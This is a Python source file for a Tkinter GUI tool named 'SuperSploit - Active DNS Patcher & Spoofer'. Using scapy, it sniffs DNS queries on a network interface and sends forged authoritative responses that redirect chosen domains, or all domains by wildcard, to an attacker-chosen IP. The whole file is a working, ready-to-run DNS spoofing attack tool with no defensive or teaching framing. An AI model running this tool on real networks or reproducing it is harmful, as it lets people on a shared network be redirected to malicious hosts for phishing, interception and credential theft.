import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox
import threading
import time
import sys
import os

try:
    from scapy.all import sniff, send, IP, UDP, DNS, DNSQR, DNSRR
    HAS_SCAPY = True
except ImportError:
    HAS_SCAPY = False

try:
    from source.core.license_manager import LicenseManager
except ImportError:
    class LicenseManager:
        @staticmethod
        def gate_access(f): return True

class DNSPatcherGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("SuperSploit - Active DNS Patcher & Spoofer")
        self.root.geometry("900x700")
        
        # Sentry/Modern Dark Color Palette
        self.bg_main = "#181825"
        self.bg_sec = "#1e1e2e"
        self.accent = "#6c5fc7"
        self.accent_hover = "#8a7edb"
        self.fg_main = "#ffffff"
        self.term_bg = "#0d0d14"
        self.term_fg = "#00ffcc"
        
        self.root.configure(bg=self.bg_main)
        self.style = ttk.Style()
        self.style.theme_use('clam')
        
        # Global ttk Style Overhauls
        self.style.configure(".", background=self.bg_main, foreground=self.fg_main, font=("Helvetica", 10))
        self.style.configure("TFrame", background=self.bg_main)
        self.style.configure("TLabelframe", background=self.bg_sec, borderwidth=1, bordercolor=self.bg_main)
        self.style.configure("TLabelframe.Label", background=self.bg_sec, foreground=self.accent, font=("Helvetica", 11, "bold"))
        self.style.configure("TLabel", background=self.bg_sec, foreground=self.fg_main)
        
        # Button & Entry Styling
        self.style.configure("TButton", background=self.accent, foreground="#ffffff", font=("Helvetica", 10, "bold"), borderwidth=0, padding=6)
        self.style.map("TButton", background=[("active", self.accent_hover)])
        self.style.configure("TEntry", fieldbackground="#313244", foreground="#ffffff", borderwidth=0, insertcolor="#ffffff")
        
        # Treeview (Tables) Styling
        self.style.configure("Treeview", background=self.bg_main, foreground=self.fg_main, fieldbackground=self.bg_main, borderwidth=0, rowheight=28)
        self.style.configure("Treeview.Heading", background=self.bg_sec, foreground=self.accent, font=("Helvetica", 10, "bold"), borderwidth=0)
        self.style.map("Treeview", background=[('selected', self.accent)], foreground=[('selected', '#ffffff')])

        self.is_running = False
        self.patch_rules = {}  # Format: {"google.com": "192.168.1.100"}
        
        self._build_ui()

    def _build_ui(self):
        main_frame = ttk.Frame(self.root, padding="20")
        main_frame.pack(fill=tk.BOTH, expand=True)

        # --- Interface & Controls ---
        top_frame = ttk.LabelFrame(main_frame, text=" ⚙️ Spoofer Configuration ", padding="15")
        top_frame.pack(fill=tk.X, pady=(0, 10))

        ttk.Label(top_frame, text="Network Interface (e.g., eth0, wlan0):").grid(row=0, column=0, sticky=tk.W, padx=10, pady=5)
        self.iface_entry = ttk.Entry(top_frame, width=20, font=("Helvetica", 11))
        self.iface_entry.insert(0, "wlan0")
        self.iface_entry.grid(row=0, column=1, padx=10, pady=5, sticky=tk.W)

        # --- Rule Manager ---
        rule_frame = ttk.LabelFrame(main_frame, text=" 🎯 Active DNS Patches ", padding="15")
        rule_frame.pack(fill=tk.X, pady=(0, 10))

        input_frame = ttk.Frame(rule_frame)
        input_frame.pack(fill=tk.X, pady=(0, 10))

        ttk.Label(input_frame, text="Target Domain (Use * for all):").pack(side=tk.LEFT, padx=(0, 5))
        self.domain_entry = ttk.Entry(input_frame, width=25, font=("Helvetica", 11))
        self.domain_entry.insert(0, "example.com")
        self.domain_entry.pack(side=tk.LEFT, padx=5)

        ttk.Label(input_frame, text="Spoofed IP:").pack(side=tk.LEFT, padx=10)
        self.ip_entry = ttk.Entry(input_frame, width=20, font=("Helvetica", 11))
        self.ip_entry.insert(0, "127.0.0.1")
        self.ip_entry.pack(side=tk.LEFT, padx=5)

        ttk.Button(input_frame, text="➕ ADD PATCH", command=self._add_rule).pack(side=tk.LEFT, padx=10)
        ttk.Button(input_frame, text="➖ REMOVE", command=self._remove_rule).pack(side=tk.LEFT)

        cols = ("Domain", "Spoofed IP")
        self.rule_tree = ttk.Treeview(rule_frame, columns=cols, show="headings", selectmode="browse", height=5)
        self.rule_tree.tag_configure('oddrow', background=self.bg_main)
        self.rule_tree.tag_configure('evenrow', background=self.bg_sec)
        
        for c in cols:
            self.rule_tree.heading(c, text=c)
            self.rule_tree.column(c, anchor=tk.W)
        
        self.rule_tree.pack(fill=tk.X, expand=True)

        # --- Action Banners ---
        btn_frame = ttk.Frame(main_frame)
        btn_frame.pack(fill=tk.X, pady=(0, 10))

        self.start_btn = ttk.Button(btn_frame, text="🚀 START DNS PATCHER", command=self._start_patcher)
        self.start_btn.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 5), ipady=3)

        self.stop_btn = ttk.Button(btn_frame, text="🛑 STOP DNS PATCHER", command=self._stop_patcher, state=tk.DISABLED)
        self.stop_btn.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(5, 0), ipady=3)

        # --- Console ---
        log_frame = ttk.LabelFrame(main_frame, text=" 📜 Live Intercept Console ", padding="5")
        log_frame.pack(fill=tk.BOTH, expand=True)
        
        self.console = scrolledtext.ScrolledText(log_frame, bg=self.term_bg, fg=self.term_fg, font=("Consolas", 11), relief=tk.FLAT, padx=10, pady=10)
        self.console.pack(fill=tk.BOTH, expand=True)

        if not HAS_SCAPY:
            self._log("[-] SCAPY MISSING. Please run: pip install scapy")
            self.start_btn.config(state=tk.DISABLED)

    def _log(self, msg):
        timestamp = time.strftime("[%H:%M:%S]")
        def _update():
            self.console.config(state=tk.NORMAL)
            self.console.insert(tk.END, f"{timestamp} {msg}\n")
            self.console.see(tk.END)
            self.console.config(state=tk.DISABLED)
        self.root.after(0, _update)

    def _refresh_tree(self):
        for item in self.rule_tree.get_children():
            self.rule_tree.delete(item)
        for i, (dom, ip) in enumerate(self.patch_rules.items()):
            tag = 'evenrow' if i % 2 == 0 else 'oddrow'
            self.rule_tree.insert("", tk.END, values=(dom, ip), tags=(tag,))

    def _add_rule(self):
        dom = self.domain_entry.get().strip().lower()
        ip = self.ip_entry.get().strip()
        if dom and ip:
            self.patch_rules[dom] = ip
            self._refresh_tree()
            self._log(f"[*] DNS Patch Added: {dom} -> {ip}")

    def _remove_rule(self):
        selected = self.rule_tree.selection()
        if selected:
            item = self.rule_tree.item(selected[0])
            dom = item['values'][0]
            if dom in self.patch_rules:
                del self.patch_rules[dom]
                self._refresh_tree()
                self._log(f"[*] DNS Patch Removed: {dom}")

    def _process_packet(self, packet):
        if not self.is_running:
            return

        # Intercept only DNS queries
        if packet.haslayer(DNS) and packet.getlayer(DNS).qr == 0:
            queried_domain = packet.getlayer(DNSQR).qname.decode('utf-8', errors='ignore').strip('.')
            
            spoofed_ip = None
            # Check exact match
            if queried_domain in self.patch_rules:
                spoofed_ip = self.patch_rules[queried_domain]
            # Check wildcard match
            elif "*" in self.patch_rules:
                spoofed_ip = self.patch_rules["*"]

            if spoofed_ip:
                try:
                    # Craft the forged response
                    ip_layer = IP(dst=packet[IP].src, src=packet[IP].dst)
                    udp_layer = UDP(dport=packet[UDP].sport, sport=packet[UDP].dport)
                    ans = DNSRR(rrname=packet[DNSQR].qname, rdata=spoofed_ip)
                    dns_layer = DNS(id=packet[DNS].id, qr=1, aa=1, qd=packet[DNS].qd, an=ans)
                    
                    forged_pkt = ip_layer / udp_layer / dns_layer
                    send(forged_pkt, verbose=0, iface=self.iface_entry.get().strip())
                    
                    self._log(f"[+] FORGED: {queried_domain} -> {spoofed_ip} (To: {packet[IP].src})")
                except Exception as e:
                    self._log(f"[-] Packet Forge Error: {e}")

    def _sniff_thread(self):
        iface = self.iface_entry.get().strip()
        self._log(f"\n[*] Starting DNS Patcher Engine on interface: {iface}")
        self._log(f"[*] Intercepting UDP Port 53...")
        
        try:
            sniff(filter="udp port 53", iface=iface, prn=self._process_packet, store=0, stop_filter=lambda x: not self.is_running)
            self._log("[*] DNS Patcher Engine gracefully stopped.")
        except Exception as e:
            self._log(f"[-] Sniffer crashed (Run as Root?): {e}")
            self.root.after(0, self._stop_patcher)

    def _start_patcher(self):
        if not self.patch_rules:
            messagebox.showwarning("Warning", "Add at least one DNS patch rule first.")
            return
            
        self.is_running = True
        self.start_btn.config(state=tk.DISABLED)
        self.stop_btn.config(state=tk.NORMAL)
        
        threading.Thread(target=self._sniff_thread, daemon=True).start()

    def _stop_patcher(self):
        self.is_running = False
        self._log("[*] Halting DNS Patcher...")
        self.start_btn.config(state=tk.NORMAL)
        self.stop_btn.config(state=tk.DISABLED)

if __name__ == "__main__":
    if not LicenseManager.gate_access("Active DNS Patcher"):
        sys.exit(1)
    root = tk.Tk()
    app = DNSPatcherGUI(root)
    root.mainloop()